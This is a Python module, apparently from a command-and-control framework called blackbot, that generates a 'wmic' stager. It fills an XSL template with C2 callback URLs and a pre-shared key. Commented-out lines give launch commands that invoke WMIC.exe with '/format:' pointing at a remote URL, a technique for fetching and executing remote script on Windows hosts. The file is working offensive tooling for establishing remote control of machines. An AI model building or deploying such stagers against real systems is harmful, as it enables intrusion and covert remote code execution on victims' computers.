import uuid
from blackbot.core.wss.crypto import gen_stager_psk
from blackbot.core.wss.stager import Stager
from blackbot.core.utils import get_path_in_package


class ARTIC2Stager(Stager):
    def __init__(self):
        self.name = 'wmic'
        self.description = 'Stage via wmic XSL execution'
        self.suggestions = ''
        self.extension = 'xsl'
        self.last_updated_by = 'Blackbot Security, Inc.'
        self.options = {}

    def generate(self, listener):
        with open(get_path_in_package('core/wss/stagers/templates/wmic.xsl')) as template:
            c2_urls = ','.join(
                filter(None, [listener['CallBackURls']])
            )

            guid = uuid.uuid4()
            psk = gen_stager_psk()

            template = template.read()
            template = template.replace("C2_URL", c2_urls)
            return guid, psk, template

            #print_good(f"Generated stager to {stager.name}")
            #print_info("Launch with:")
            #print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
            #print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")
